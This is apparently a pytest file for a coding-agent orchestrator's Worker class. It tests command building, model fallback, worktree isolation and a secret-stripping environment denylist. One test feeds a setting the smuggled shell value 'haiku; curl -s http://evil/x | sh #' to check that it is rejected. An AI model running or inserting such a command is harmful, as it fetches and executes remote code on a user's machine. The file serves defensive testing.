"""Tests for pure-logic Worker methods (no subprocess needed)."""

from __future__ import annotations

import importlib.util
import logging
import sys
from pathlib import Path

import pytest
from agent_runtime import AgentRuntimeSelectionError

# ─── Load real Worker module bypassing conftest mock ──────────────────────────
# conftest.py patches sys.modules["worker"] with a MagicMock to prevent
# subprocess side-effects during task_queue tests. We need the real class here,
# so we load worker.py under a private name to bypass that mock.

_WORKER_FILE = Path(__file__).parent.parent / "worker.py"
_spec = importlib.util.spec_from_file_location("_real_worker", _WORKER_FILE)
_mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_mod)  # type: ignore[union-attr]
Worker = _mod.Worker
WorkerPool = _mod.WorkerPool


# ─── Fixtures ─────────────────────────────────────────────────────────────────


@pytest.fixture
def worker(tmp_path: Path) -> Worker:
    """A Worker instance backed by tmp_path directories."""
    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir()
    return Worker(
        task_id="task-abc123",
        description="Fix the login bug",
        model="sonnet",
        project_dir=tmp_path,
        claude_dir=claude_dir,
    )


# ─── Tests ────────────────────────────────────────────────────────────────────


def test_worker_init(worker: Worker) -> None:
    assert worker.status == "starting"
    assert len(worker.id) == 8
    assert worker.description == "Fix the login bug"


def test_worker_to_dict_keys(worker: Worker) -> None:
    d = worker.to_dict()
    expected_keys = {
        "id", "task_id", "description", "model", "status", "pid",
        "elapsed_s", "last_commit", "log_file", "verified",
        "auto_committed", "auto_pushed", "branch_name", "pr_url",
        "pr_merged", "log_tail", "failure_context", "worktree_path",
        "oracle_result", "oracle_reason", "model_score",
        "estimated_tokens", "context_warning",
        "input_tokens", "output_tokens", "estimated_cost",
    }
    assert expected_keys.issubset(d.keys())
    # description truncated to 80 chars
    assert len(d["description"]) <= 80


def test_worker_is_alive_false_when_no_proc(worker: Worker) -> None:
    assert worker.proc is None
    assert worker.is_alive() is False


def test_worker_elapsed_s(worker: Worker) -> None:
    t0 = worker.elapsed_s
    # elapsed_s should be non-negative and stable (same-second call)
    assert t0 >= 0
    t1 = worker.elapsed_s
    assert t1 >= t0


def test_worker_build_cmd_and_env(tmp_path: Path) -> None:
    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir()
    w = Worker(
        task_id="task-xyz",
        description="Write tests",
        model="haiku",
        project_dir=tmp_path,
        claude_dir=claude_dir,
    )
    task_file = tmp_path / "task.md"
    task_file.write_text("do the thing")

    cmd, env = w._build_cmd_and_env(task_file)

    assert "--dangerously-skip-permissions" in cmd
    # model alias resolved: "haiku" → full model name
    assert "claude-haiku" in cmd
    # CLAUDECODE must not be in the env dict
    assert "CLAUDECODE" not in env
    # traceability: committer.sh appends X-Clade-Task when this is set, so every
    # worker-session commit is agent-segmentable without claiming co-authorship
    assert env["CLADE_WORKER_TASK_ID"] == "task-xyz"
    # model provenance (Round-4 gap): committer.sh appends an Agent-Signature
    # trailer from this — must be the resolved model actually used for the
    # --model flag, not the raw alias ("haiku" → "claude-haiku...")
    assert env["CLADE_WORKER_MODEL"] == config._MODEL_ALIASES["haiku"]
    assert env["CLADE_WORKER_MODEL"] in cmd
    # gap C: overload failover is OFF by default (no flag leaks into the spawn)
    assert "--fallback-model" not in cmd


def test_codex_worker_threads_effort_into_command_and_status(tmp_path: Path) -> None:
    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir()
    worker = Worker(
        task_id="task-codex",
        description="Implement the bounded change",
        model="gpt-5.6-terra",
        project_dir=tmp_path,
        claude_dir=claude_dir,
        agent_runtime="codex",
        effort="medium",
        route_reason="high readiness: cheap Codex tier",
    )
    task_file = tmp_path / "task.md"
    task_file.write_text("do the bounded thing")
    cmd, _ = worker._build_cmd_and_env(task_file)
    status = worker.to_dict()
    assert 'model_reasoning_effort="medium"' in cmd
    assert status["agent_runtime"] == "codex"
    assert "provider" not in status
    assert status["effort"] == "medium"
    assert "cheap Codex" in status["route_reason"]


@pytest.mark.asyncio
async def test_worker_pool_invalid_runtime_fails_before_spawn_and_marks_task(
    tmp_path: Path,
) -> None:
    class RecordingTaskQueue:
        def __init__(self):
            self.updates = []

        async def update(self, task_id, **values):
            self.updates.append((task_id, values))

    queue = RecordingTaskQueue()
    pool = WorkerPool()
    task = {
        "id": "task-invalid-runtime",
        "description": "Implement a bounded change",
        "model": "sonnet",
        "agent_runtime": "claud",
    }

    with pytest.raises(
        AgentRuntimeSelectionError, match="Unsupported agent runtime"
    ):
        await pool.start_worker(
            task, queue, tmp_path, tmp_path / ".claude"
        )

    assert pool.all() == []
    assert queue.updates == [
        (
            "task-invalid-runtime",
            {
                "status": "failed",
                "failed_reason": (
                    "Unsupported agent runtime 'claud'. "
                    "Supported runtimes: claude, codex."
                ),
                "route_reason": "agent runtime selection failed",
            },
        )
    ]


# ─── Overload failover (gap C) + spawn-env denylist (security sliver) ─────────

import config  # noqa: E402 — real config module shared with the worker under test


@pytest.fixture(autouse=True)
def _canonical_default_runtime(monkeypatch):
    """Unit behavior must not depend on the operator's local runtime choice."""

    monkeypatch.setitem(config.GLOBAL_SETTINGS, "agent_runtime", "claude")


def _worker(tmp_path: Path, model: str = "sonnet") -> Worker:
    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir(exist_ok=True)
    return Worker(task_id="t", description="d", model=model,
                  project_dir=tmp_path, claude_dir=claude_dir)


def test_fallback_model_explicit_alias(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_fallback_model", "haiku")
    cmd, _ = _worker(tmp_path, model="opus")._build_cmd_and_env(tmp_path / "t.md")
    assert f"--fallback-model {config._MODEL_ALIASES['haiku']}" in cmd


def test_agent_signature_discloses_fallback_when_configured(tmp_path: Path, monkeypatch) -> None:
    # Adversarial-review finding (concurrency, MEDIUM): --fallback-model swaps
    # models for a single overloaded TURN entirely inside the claude CLI process,
    # invisible to the orchestrator — CLADE_WORKER_MODEL cannot promise it names
    # the model that wrote any specific commit once a fallback is configured.
    # The trailer value must disclose that uncertainty rather than silently
    # asserting a single (possibly wrong) model name.
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_fallback_model", "haiku")
    _, env = _worker(tmp_path, model="opus")._build_cmd_and_env(tmp_path / "t.md")
    assert env["CLADE_WORKER_MODEL"].startswith(config._MODEL_ALIASES["opus"])
    assert "fallback-configured" in env["CLADE_WORKER_MODEL"]
    assert config._MODEL_ALIASES["haiku"] in env["CLADE_WORKER_MODEL"]


def test_agent_signature_no_disclosure_when_fallback_disabled(tmp_path: Path) -> None:
    # No worker_fallback_model configured (the default) — plain resolved model,
    # no parenthetical, matching pre-existing behavior exactly.
    _, env = _worker(tmp_path, model="haiku")._build_cmd_and_env(tmp_path / "t.md")
    assert env["CLADE_WORKER_MODEL"] == config._MODEL_ALIASES["haiku"]
    assert "fallback" not in env["CLADE_WORKER_MODEL"]


def test_fallback_model_auto_downgrades_per_worker(tmp_path: Path, monkeypatch) -> None:
    # "auto" derives from auto_classify_retry_model_fallback: sonnet → haiku
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_fallback_model", "auto")
    cmd, _ = _worker(tmp_path, model="sonnet")._build_cmd_and_env(tmp_path / "t.md")
    assert f"--fallback-model {config._MODEL_ALIASES['haiku']}" in cmd


def test_fallback_model_auto_haiku_has_no_target(tmp_path: Path, monkeypatch) -> None:
    # haiku is the floor of the downgrade map → no fallback flag emitted
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_fallback_model", "auto")
    cmd, _ = _worker(tmp_path, model="haiku")._build_cmd_and_env(tmp_path / "t.md")
    assert "--fallback-model" not in cmd


def test_fallback_auto_recovers_full_id_alias(monkeypatch) -> None:
    # a full model id (not a short alias) must be reverse-mapped to its alias
    # before the downgrade lookup: claude-sonnet-4-6 → 'sonnet' → haiku
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_fallback_model", "auto")
    assert config._resolve_fallback_model(config._MODEL_ALIASES["sonnet"]) == config.HAIKU_MODEL


def test_fallback_auto_unknown_model_returns_none(monkeypatch) -> None:
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_fallback_model", "auto")
    assert config._resolve_fallback_model("some-unknown-model") is None


def test_fallback_model_rejects_non_model_value(tmp_path: Path, monkeypatch) -> None:
    # SECURITY: a user-controlled setting is spliced into the worker shell command;
    # a non-model value (injection / typo) must be dropped, never reach the shell.
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_fallback_model",
                        "haiku; curl -s http://evil/x | sh #")
    cmd, _ = _worker(tmp_path, model="opus")._build_cmd_and_env(tmp_path / "t.md")
    assert "--fallback-model" not in cmd
    assert "curl" not in cmd and "evil" not in cmd


def test_env_denylist_string_value_coerced(tmp_path: Path, monkeypatch) -> None:
    # a bare-string setting must strip the whole var, not iterate its characters
    monkeypatch.setenv("CLADE_ONE_SECRET", "leak-me")
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_env_deny", "CLADE_ONE_SECRET")
    _, env = _worker(tmp_path)._build_cmd_and_env(tmp_path / "t.md")
    assert "CLADE_ONE_SECRET" not in env


@pytest.mark.parametrize("bad", [5, True, 3.14, {"a": 1}])
def test_env_denylist_non_list_value_degrades_not_crashes(tmp_path: Path, monkeypatch, bad) -> None:
    # a scalar/dict misconfig must degrade to a no-op denylist, never crash the
    # spawn (iterating an int raises TypeError → would brick every worker)
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_env_deny", bad)
    cmd, env = _worker(tmp_path)._build_cmd_and_env(tmp_path / "t.md")  # must not raise
    assert "--dangerously-skip-permissions" in cmd


def test_env_denylist_pops_keys(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.setenv("CLADE_TEST_SECRET", "leak-me")
    monkeypatch.setenv("CLADE_TEST_KEEP", "ok")
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_env_deny", ["CLADE_TEST_SECRET"])
    _, env = _worker(tmp_path)._build_cmd_and_env(tmp_path / "t.md")
    assert "CLADE_TEST_SECRET" not in env      # denied secret dropped from worker env
    assert env.get("CLADE_TEST_KEEP") == "ok"  # unrelated vars still pass through


def test_env_denylist_empty_is_noop(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.setenv("CLADE_TEST_KEEP", "ok")
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_env_deny", [])
    _, env = _worker(tmp_path)._build_cmd_and_env(tmp_path / "t.md")
    assert env.get("CLADE_TEST_KEEP") == "ok"


# ─── Delegation to worker_utils (wave-2 extraction for the 1500-line cap) ─────


def test_check_file_ownership_delegates_to_worker_utils(worker: Worker) -> None:
    """Worker._check_file_ownership is a thin delegate over the moved glob logic."""
    worker.own_files = ["src/**"]
    worker.forbidden_files = ["secrets/**"]

    ok, reason = worker._check_file_ownership(["src/a.py"])
    assert ok is True
    assert reason == ""

    ok, reason = worker._check_file_ownership(["other/b.py"])
    assert ok is False
    assert "OWN_FILES" in reason

    ok, reason = worker._check_file_ownership(["secrets/key.pem"])
    assert ok is False
    assert "FORBIDDEN_FILES" in reason


def test_get_activity_state_delegates(worker: Worker) -> None:
    """No session JSONL under tmp claude_dir → 'unknown' via the moved helper."""
    assert worker._get_activity_state() == "unknown"


def test_classify_retry_helper_is_reexported_from_worker_utils() -> None:
    """Pure move + re-export: worker exposes the worker_utils function object."""
    import worker_utils

    assert _mod._maybe_enqueue_classify_retry is worker_utils._maybe_enqueue_classify_retry


# ─── context_budget_warning delivery (Round-4 dead-code fix) ──────────────────
# The warning file used to be keyed by the Worker's own internal `.id` — but the
# ONLY identifier available inside the worker's own hook environment is
# CLADE_WORKER_TASK_ID (task_id). context-warning-drain.sh looks the file up by
# task_id, so the write site must key by the same value or delivery can never
# find it.


async def test_context_budget_warning_keyed_by_task_id(tmp_path: Path, monkeypatch) -> None:
    from unittest.mock import AsyncMock

    from task_queue import TaskQueue

    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir()
    w = Worker(
        task_id="task-abc123", description="x" * 700_000, model="sonnet",
        project_dir=tmp_path, claude_dir=claude_dir,
    )
    w.status = "running"
    w.task_timeout = 0
    monkeypatch.setattr(w, "poll", AsyncMock())  # no real subprocess to poll here

    pool = _mod.WorkerPool()
    pool.workers[w.id] = w
    tq = TaskQueue(claude_dir)

    await pool.poll_all(tq)

    assert (claude_dir / f"context-warning-{w.task_id}.md").exists()
    assert not (claude_dir / f"context-warning-{w.id}.md").exists()


# ─── Typed handoff logging accuracy (Round-4 adversarial-review finding) ──────
# _handoff_to_worker can return None on two clean, non-exceptional paths (no
# handoff_type/payload on the row; the newly-added child task can't be
# re-fetched) — poll_all used to log a "child worker spawned" success message
# unconditionally regardless of the return value.


async def test_typed_handoff_noop_does_not_log_success(tmp_path: Path, monkeypatch, caplog) -> None:
    from unittest.mock import AsyncMock

    from task_queue import TaskQueue

    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir()
    tq = TaskQueue(claude_dir)
    task = await tq.add("do the thing")
    # handoff_type/handoff_payload left at their schema defaults (None / '{}') —
    # _handoff_to_worker's own internal check (parent_task.get("handoff_type"))
    # will be falsy, so it returns None with no child task created.

    w = Worker(
        task_id=task["id"], description="do the thing", model="sonnet",
        project_dir=tmp_path, claude_dir=claude_dir,
    )
    w.status = "done"
    w._terminal_persisted = True
    w._handoff_type = "some-type"
    w._handoff_payload = {"k": "v"}
    monkeypatch.setattr(w, "poll", AsyncMock())

    pool = _mod.WorkerPool()
    pool.workers[w.id] = w

    with caplog.at_level(logging.INFO):
        await pool.poll_all(tq)

    tasks = await tq.list()
    assert len(tasks) == 1  # no child task was created
    assert not any("child worker spawned" in r.message for r in caplog.records)
    assert any("did not spawn a child worker" in r.message for r in caplog.records)


async def test_typed_handoff_success_logs_success(tmp_path: Path, monkeypatch, caplog) -> None:
    from unittest.mock import AsyncMock

    from task_queue import TaskQueue

    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir()
    tq = TaskQueue(claude_dir)
    task = await tq.add("do the thing")

    w = Worker(
        task_id=task["id"], description="do the thing", model="sonnet",
        project_dir=tmp_path, claude_dir=claude_dir,
    )
    w.status = "done"
    w._terminal_persisted = True
    w._handoff_type = "some-type"
    w._handoff_payload = {"k": "v"}
    monkeypatch.setattr(w, "poll", AsyncMock())

    pool = _mod.WorkerPool()
    pool.workers[w.id] = w
    # Isolate the logging-accuracy fix from _handoff_to_worker's own internals
    # (a separate concern) — a real spawn is simulated by a non-None return.
    monkeypatch.setattr(pool, "_handoff_to_worker", AsyncMock(return_value=object()))

    with caplog.at_level(logging.INFO):
        await pool.poll_all(tq)

    assert any("child worker spawned" in r.message for r in caplog.records)


# ─── Worktree isolation must fail closed ──────────────────────────────────────


class TestWorktreeIsolationFailsClosed:
    """A worker must not fall back to the shared checkout in silence.

    Every failure path in _setup_worktree set _worktree_path = None, discarded
    git's stderr, and left _project_dir on the main checkout — so an agent
    spawned with --dangerously-skip-permissions edited the user's own working
    tree with nothing logged. CLAUDE.md names uncoordinated parallel writers to
    shared build/test state as a real race, not a hypothetical one.
    """

    @staticmethod
    def _git_repo(path: Path) -> Path:
        import subprocess

        path.mkdir(parents=True, exist_ok=True)
        for cmd in (
            ["git", "init", "-q"],
            ["git", "config", "user.email", "t@example.com"],
            ["git", "config", "user.name", "t"],
            ["git", "commit", "-q", "--allow-empty", "-m", "root"],
        ):
            subprocess.run(cmd, cwd=path, check=True, capture_output=True)
        return path

    def _worker(self, tmp_path: Path, project_dir: Path) -> Worker:
        claude_dir = tmp_path / ".claude"
        claude_dir.mkdir(exist_ok=True)
        return Worker(
            task_id="task-wt",
            description="isolate me",
            model="sonnet",
            project_dir=project_dir,
            claude_dir=claude_dir,
        )

    async def test_returns_false_and_keeps_gits_stderr_when_not_a_repo(self, tmp_path: Path):
        project = tmp_path / "proj"
        project.mkdir()  # deliberately NOT a git repo
        w = self._worker(tmp_path, project)

        assert await w._setup_worktree() is False
        assert w._worktree_path is None
        # git's message must survive — it was captured and thrown away before,
        # leaving an isolation failure with no diagnosis anywhere.
        assert w._worktree_error, "git stderr was discarded again"

    async def test_start_refuses_to_run_in_the_shared_checkout(self, tmp_path: Path):
        """The failure is survivable; proceeding after it is not.

        start_worker_with_evidence already turns a raise into a failed worker
        with its evidence attempt closed, so raising is the handled path.
        """
        project = tmp_path / "proj"
        project.mkdir()
        w = self._worker(tmp_path, project)

        with pytest.raises(RuntimeError, match="shared checkout"):
            await w.start()
        assert w.proc is None, "no agent may be spawned once isolation failed"

    async def test_kill_switch_restores_the_old_fallback(self, tmp_path: Path):
        from config import GLOBAL_SETTINGS

        project = tmp_path / "proj"
        project.mkdir()
        w = self._worker(tmp_path, project)
        original = GLOBAL_SETTINGS.get("worker_require_worktree", True)
        GLOBAL_SETTINGS["worker_require_worktree"] = False
        try:
            # Not raising is the whole assertion; the spawn itself is out of
            # scope here (and would need a real agent CLI).
            assert await w._setup_worktree() is False
        finally:
            GLOBAL_SETTINGS["worker_require_worktree"] = original

    async def test_succeeds_and_moves_project_dir_inside_a_real_repo(self, tmp_path: Path):
        repo = self._git_repo(tmp_path / "repo")
        w = self._worker(tmp_path, repo)

        assert await w._setup_worktree() is True
        assert w._worktree_path is not None and w._worktree_path.exists()
        assert w._project_dir == w._worktree_path


# ─── A stopped worker must not lose its work ──────────────────────────────────


class TestStopPreservesWork:
    """`stop()` skips verification by design and then force-removes the worktree.

    A worker commits exactly once, at the end of verification, so every
    uncommitted byte was deleted. That is not only the UI's stop button —
    `worker.py` calls `stop()` from loop detection and the stuck-worker
    timeout, where nobody is watching. The branch survives worktree removal, so
    a WIP commit on it makes the work recoverable.
    """

    @staticmethod
    def _repo(tmp_path):
        import subprocess

        repo = tmp_path / "repo"
        repo.mkdir()
        for cmd in (
            ["git", "init", "-q"],
            ["git", "config", "user.email", "t@example.com"],
            ["git", "config", "user.name", "t"],
            ["git", "commit", "-q", "--allow-empty", "-m", "root"],
        ):
            subprocess.run(cmd, cwd=repo, check=True, capture_output=True)
        return repo

    async def test_uncommitted_work_survives_on_the_branch(self, tmp_path: Path):
        import subprocess

        from worker_utils import preserve_worktree_wip

        repo = self._repo(tmp_path)
        wt = tmp_path / "wt"
        branch = "orchestrator/task-1"
        subprocess.run(["git", "worktree", "add", "-q", str(wt), "-b", branch],
                       cwd=repo, check=True, capture_output=True)
        (wt / "work.txt").write_text("40 minutes of work\n")

        sha = await preserve_worktree_wip(wt, branch, "stopped")
        assert sha, "nothing was committed, so the force-remove would destroy it"

        subprocess.run(["git", "worktree", "remove", "--force", str(wt)],
                       cwd=repo, check=True, capture_output=True)
        recovered = subprocess.run(
            ["git", "cat-file", "-p", f"{branch}:work.txt"],
            cwd=repo, capture_output=True, text=True,
        )
        assert recovered.returncode == 0
        assert "40 minutes of work" in recovered.stdout

    async def test_a_clean_worktree_produces_no_commit(self, tmp_path: Path):
        """No junk commits on the normal path."""
        import subprocess

        from worker_utils import preserve_worktree_wip

        repo = self._repo(tmp_path)
        wt = tmp_path / "wt"
        subprocess.run(["git", "worktree", "add", "-q", str(wt), "-b", "b1"],
                       cwd=repo, check=True, capture_output=True)
        assert await preserve_worktree_wip(wt, "b1", "stopped") is None

    async def test_missing_worktree_or_branch_is_safe(self, tmp_path: Path):
        from worker_utils import preserve_worktree_wip

        assert await preserve_worktree_wip(None, "b1", "stopped") is None
        assert await preserve_worktree_wip(tmp_path / "gone", "b1", "stopped") is None
        assert await preserve_worktree_wip(tmp_path, None, "stopped") is None

    async def test_repo_hooks_do_not_run_on_the_rescue_commit(self, tmp_path: Path):
        """A hostile or merely broken pre-commit hook must not block the rescue."""
        import subprocess

        from worker_utils import preserve_worktree_wip

        repo = self._repo(tmp_path)
        hook = repo / ".git" / "hooks" / "pre-commit"
        hook.write_text("#!/bin/sh\nexit 1\n")
        hook.chmod(0o755)

        wt = tmp_path / "wt"
        subprocess.run(["git", "worktree", "add", "-q", str(wt), "-b", "b1"],
                       cwd=repo, check=True, capture_output=True)
        (wt / "work.txt").write_text("work\n")

        assert await preserve_worktree_wip(wt, "b1", "stopped"), "hook blocked the rescue"


# ─── The denylist ships a real default, and it is shape-based ─────────────────


@pytest.fixture
def shipped_env_policy(monkeypatch):
    """Pin the SHIPPED defaults, not the operator's live settings file.

    GLOBAL_SETTINGS is a merge of _SETTINGS_DEFAULTS with
    ~/.claude/orchestrator-settings.json, so without this a machine that pins
    `worker_env_deny: []` makes these tests pass vacuously — testing the
    machine rather than the code.
    """
    for key in ("worker_env_deny", "worker_env_allow"):
        monkeypatch.setitem(config.GLOBAL_SETTINGS, key, config._SETTINGS_DEFAULTS[key])


def test_the_shipped_default_blocks_real_secret_shapes(
    tmp_path: Path, monkeypatch, shipped_env_policy
) -> None:
    """`worker_env_deny` defaulted to [] for its whole life.

    The mechanism that "strips secrets an untrusted-text worker shouldn't read"
    therefore never once applied — while workers spawn with permissions
    bypassed and the webhook could feed them text from a GitHub comment.
    """
    for name in (
        "TG_BOT_TOKEN", "AWS_SECRET_ACCESS_KEY", "GOOGLE_APPLICATION_CREDENTIALS",
        "MINIMAX_API_KEY", "OPENAI_API_KEY", "DB_PASSWORD", "DEPLOY_PRIVATE_KEY",
    ):
        monkeypatch.setenv(name, "leak-me")
    monkeypatch.setenv("PATH_KEEP_ME", "ok")

    _, env = _worker(tmp_path)._build_cmd_and_env(tmp_path / "t.md")

    for name in (
        "TG_BOT_TOKEN", "AWS_SECRET_ACCESS_KEY", "GOOGLE_APPLICATION_CREDENTIALS",
        "MINIMAX_API_KEY", "OPENAI_API_KEY", "DB_PASSWORD", "DEPLOY_PRIVATE_KEY",
    ):
        assert name not in env, f"{name} reached the worker"
    assert env.get("PATH_KEEP_ME") == "ok"
    assert env.get("PATH"), "the denylist must not strip the environment it needs to run"


def test_a_secret_nobody_listed_is_still_blocked(
    tmp_path: Path, monkeypatch, shipped_env_policy
) -> None:
    """The point of matching on shape: an enumeration goes stale silently.

    A stale denylist reads exactly like a working one, which is how the [] default
    survived. `*_API_KEY` covers the key that has not been invented yet.
    """
    monkeypatch.setenv("SOME_VENDOR_NOBODY_LISTED_API_KEY", "leak-me")
    _, env = _worker(tmp_path)._build_cmd_and_env(tmp_path / "t.md")
    assert "SOME_VENDOR_NOBODY_LISTED_API_KEY" not in env


def test_the_allowlist_wins_so_push_keeps_working(
    tmp_path: Path, monkeypatch, shipped_env_policy
) -> None:
    """`gh` usually reads ~/.config/gh/hosts.yml, but not on every machine.

    On one that uses the env var, a shape-based deny would break the worker's
    own push — so the exception is explicit rather than a hole in the pattern.
    """
    monkeypatch.setenv("GH_TOKEN", "gho_x")
    monkeypatch.setenv("GITHUB_TOKEN", "ghs_x")
    _, env = _worker(tmp_path)._build_cmd_and_env(tmp_path / "t.md")
    assert env.get("GH_TOKEN") == "gho_x"
    assert env.get("GITHUB_TOKEN") == "ghs_x"


def test_anthropic_key_is_re_injected_after_the_filter(
    tmp_path: Path, monkeypatch, shipped_env_policy
) -> None:
    """`*_API_KEY` denies it, and that is fine — the provider runs afterwards.

    `worker_provider.apply_connection_env` pops and re-injects the key from the
    selected profile AFTER the denylist, so the ordering is what makes the
    broad pattern safe. If that order ever flips, workers lose their credential.
    """
    import worker_provider

    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-from-env")
    w = _worker(tmp_path)
    injected = {}

    def fake_apply(connection, env):
        injected["saw_denied"] = "ANTHROPIC_API_KEY" not in env
        env["ANTHROPIC_API_KEY"] = "sk-ant-from-profile"

    monkeypatch.setattr(w._runtime_adapter, "apply_connection_env", fake_apply)
    _, env = w._build_cmd_and_env(tmp_path / "t.md")

    assert injected["saw_denied"], "the filter must run BEFORE the provider"
    assert env["ANTHROPIC_API_KEY"] == "sk-ant-from-profile"
